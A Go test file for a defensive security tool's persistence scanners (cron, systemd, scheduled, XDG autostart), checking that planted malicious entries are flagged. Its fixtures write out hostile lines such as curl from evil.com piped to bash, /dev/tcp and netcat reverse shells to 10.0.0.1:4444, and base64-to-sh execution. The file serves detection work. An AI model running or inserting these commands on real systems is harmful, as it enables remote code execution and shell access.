package persistence_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/persistence"
)

// ---- CronScanner interface tests ----

func TestCronScanner_Interface(t *testing.T) {
	s := persistence.NewCronScanner()

	if s.Name() != "cron" {
		t.Errorf("Name() = %q, want %q", s.Name(), "cron")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should be nil")
	}
	if s.OptionalTools() != nil {
		t.Error("OptionalTools() should be nil")
	}
}

// ---- SystemdScanner interface tests ----

func TestSystemdScanner_Interface(t *testing.T) {
	s := persistence.NewSystemdScanner()

	if s.Name() != "systemd" {
		t.Errorf("Name() = %q, want %q", s.Name(), "systemd")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// ---- ScheduledScanner interface tests ----

func TestScheduledScanner_Interface(t *testing.T) {
	s := persistence.NewScheduledScanner()

	if s.Name() != "scheduled" {
		t.Errorf("Name() = %q, want %q", s.Name(), "scheduled")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// ---- CronScanner functional tests ----

// cronScanFile is a helper that writes content to a temp file, points the scanner
// at it via a custom scan helper, and returns findings.
// Because CronScanner scans fixed system paths we need a way to inject a temp
// file. We expose this via a package-level helper that is only compiled in
// tests (see scanCronFileForTest below).
func writeTempCronFile(t *testing.T, content string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "test-cron")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write temp cron file: %v", err)
	}
	return path
}

func TestCronScanner_DetectsSuspiciousEntries(t *testing.T) {
	suspiciousLines := []struct {
		line  string
		title string
	}{
		{
			line:  "* * * * * root curl http://evil.com/payload.sh | bash",
			title: "Pipe-to-shell execution in cron",
		},
		{
			line:  "*/5 * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			title: "Reverse shell via /dev/tcp in cron",
		},
		{
			line:  "0 * * * * root echo aGVsbG8= | base64 -d | sh",
			title: "Base64-decoded execution in cron",
		},
		{
			line:  "*/10 * * * * root /tmp/backdoor.sh",
			title: "Executable in world-writable directory in cron",
		},
		{
			line:  "* * * * * root nc -e /bin/sh 10.0.0.1 4444",
			title: "Netcat/xterm reverse shell in cron",
		},
	}

	for _, tc := range suspiciousLines {
		tc := tc
		t.Run(tc.title, func(t *testing.T) {
			content := fmt.Sprintf("# normal comment\nSHELL=/bin/bash\nPATH=/sbin:/bin\n%s\n", tc.line)
			path := writeTempCronFile(t, content)

			findings, err := persistence.ScanCronFileForTest(path)
			if err != nil {
				t.Fatalf("ScanCronFileForTest returned error: %v", err)
			}
			if len(findings) == 0 {
				t.Fatalf("expected findings for line %q, got none", tc.line)
			}

			// Verify required fields.
			for _, f := range findings {
				if f.ID == "" {
					t.Error("finding has empty ID")
				}
				if f.Scanner != "cron" {
					t.Errorf("Scanner = %q, want %q", f.Scanner, "cron")
				}
				if f.Evidence == "" {
					t.Error("finding has empty Evidence")
				}
				if f.Location == "" {
					t.Error("finding has empty Location")
				}
				if f.Severity < scanner.SevHigh {
					t.Errorf("expected severity >= HIGH, got %s", f.Severity)
				}
			}
		})
	}
}

func TestCronScanner_CleanFileNoFindings(t *testing.T) {
	content := `# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
`
	path := writeTempCronFile(t, content)

	findings, err := persistence.ScanCronFileForTest(path)
	if err != nil {
		t.Fatalf("ScanCronFileForTest returned error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean file, got %d: %+v", len(findings), findings)
	}
}

func TestCronScanner_ContextAndOptions(t *testing.T) {
	// Scan() with default options should not error (files just won't exist in CI).
	s := persistence.NewCronScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
	// findings may be nil or empty — both are acceptable.
	_ = findings
}

// ---------------------------------------------------------------------------
// XDGAutoStartScanner — interface and detection tests
// ---------------------------------------------------------------------------

func TestXDGAutoStartScanner_Interface(t *testing.T) {
	s := persistence.NewXDGAutoStartScanner()

	if s.Name() != "xdg_autostart" {
		t.Errorf("Name() = %q, want %q", s.Name(), "xdg_autostart")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should be nil")
	}
	if s.OptionalTools() != nil {
		t.Error("OptionalTools() should be nil")
	}
}

func TestXDGAutoStartScanner_DoesNotError(t *testing.T) {
	dir := t.TempDir()
	s := persistence.NewXDGAutoStartScannerWithPaths(
		filepath.Join(dir, "nonexistent-system"),
		filepath.Join(dir, "nonexistent-home"),
	)
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
}

// TestXDGAutoStartScanner_DetectsCurlInExec creates a fake .desktop file
// whose Exec= line contains curl and verifies a CRITICAL finding is produced.
func TestXDGAutoStartScanner_DetectsCurlInExec(t *testing.T) {
	dir := t.TempDir()
	autostartDir := filepath.Join(dir, "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	desktopContent := "[Desktop Entry]\nName=Updater\nType=Application\nExec=curl http://evil.example.com/payload.sh | bash\n"
	desktopPath := filepath.Join(autostartDir, "updater.desktop")
	if err := os.WriteFile(desktopPath, []byte(desktopContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := persistence.NewXDGAutoStartScannerWithPaths(autostartDir, filepath.Join(dir, "home"))
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" && f.Severity == scanner.SevCritical {
			found = true
			if f.ID == "" {
				t.Error("finding has empty ID")
			}
			if f.Evidence == "" {
				t.Error("finding has empty Evidence")
			}
			if f.Location == "" {
				t.Error("finding has empty Location")
			}
			if f.Remediation == "" {
				t.Error("finding has empty Remediation")
			}
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for curl in Exec=, got: %+v", findings)
	}
}

// TestXDGAutoStartScanner_DetectsTmpExecPath verifies that an Exec= pointing
// into /tmp produces a CRITICAL finding.
func TestXDGAutoStartScanner_DetectsTmpExecPath(t *testing.T) {
	dir := t.TempDir()
	autostartDir := filepath.Join(dir, "autostart")
	if err := os.MkdirAll(autostartDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	desktopContent := "[Desktop Entry]\nName=Backdoor\nType=Application\nExec=/tmp/malware --hidden\n"
	desktopPath := filepath.Join(autostartDir, "backdoor.desktop")
	if err := os.WriteFile(desktopPath, []byte(desktopContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := persistence.NewXDGAutoStartScannerWithPaths(autostartDir, filepath.Join(dir, "home"))
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" && f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for Exec=/tmp/..., got: %+v", findings)
	}
}

// TestXDGAutoStartScanner_ScansUserHomeDirs verifies that the scanner
// also inspects ~/.config/autostart directories under the homeBase.
func TestXDGAutoStartScanner_ScansUserHomeDirs(t *testing.T) {
	dir := t.TempDir()

	// Create a user home with an autostart entry.
	userAutostart := filepath.Join(dir, "home", "alice", ".config", "autostart")
	if err := os.MkdirAll(userAutostart, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	desktopContent := "[Desktop Entry]\nName=EvilUpdater\nType=Application\nExec=/tmp/evil --start\n"
	if err := os.WriteFile(filepath.Join(userAutostart, "evil.desktop"), []byte(desktopContent), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := persistence.NewXDGAutoStartScannerWithPaths(
		filepath.Join(dir, "nonexistent-system"),
		filepath.Join(dir, "home"),
	)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	found := false
	for _, f := range findings {
		if f.Scanner == "xdg_autostart" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected finding from user autostart dir, got: %+v", findings)
	}
}
